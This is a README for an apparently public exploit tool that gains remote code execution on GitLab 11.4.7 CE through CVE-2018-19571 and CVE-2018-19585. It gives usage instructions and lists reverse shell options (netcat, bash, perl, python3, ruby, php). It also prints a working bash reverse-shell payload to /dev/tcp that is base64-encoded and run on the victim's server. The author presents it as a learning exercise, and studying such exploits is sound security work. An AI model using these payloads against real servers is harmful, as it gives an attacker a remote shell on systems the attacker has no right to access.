# gitlab-RCE-11.4.7
GitLab 11.4.7 CE RCE exploit with different reverse shells.  
CVE-2018-19571: https://nvd.nist.gov/vuln/detail/CVE-2018-19571  
CVE-2018-19585: https://nvd.nist.gov/vuln/detail/CVE-2018-19585

Modification of the version from [Sam Redmond and Tam Lai Yin](https://github.com/ctrlsam/GitLab-11.4.7-RCE) in order to learn and practice.

## How to use

It is written in python3 as all things should be.

Dependencies:
```
pip3 install requests
```

Use:

```
python3 rce_script.py -u <username> -p <password> -g <url:port> -l <local ip> -P <local port> [<shell lang>]
```

By default, the netcat with -e option shell is used.


## Build-in shells

Current build-in shells:

  - nc_e
    - Netcat with the -e option.
  - bash: 
    - Bash executed with absolute path.
  - perl: 
    - Perl executed from the $PATH.
  - python3: 
    - Python3 executed from the $PATH.
  - ruby: 
    - Ruby executed from the $PATH.
  - php: 
    - PHP executed from the $PATH. **Note**: Usually doesn't work in the GitLab docker.

## Add user-defined shells

Some shells contain characters thats doesn't get along with the request encoding. Therefore they are encoded in Base64 and then decoded and executed in the victim's machine.

If you want to add your own shell, add a value to the ```payloads_dict``` structure.

You must define the following:

```python
'bash': {
    # If the raw_payload can be executed withoud encoding
    'safe': False,
    # Payload, must contain the references for the local_ip and for the local_port
    'raw_payload': 'bash -i >& /dev/tcp/{local_ip}/{local_port} 0>&1',
    # How to execute the payload if safe is False. Must conatin the reference for payload
    'exec_string': 'echo {payload} | base64 -d | /bin/bash'
}
```

## Disclaimer

The HTML parsing is pretty hardcoded, it may break easily.



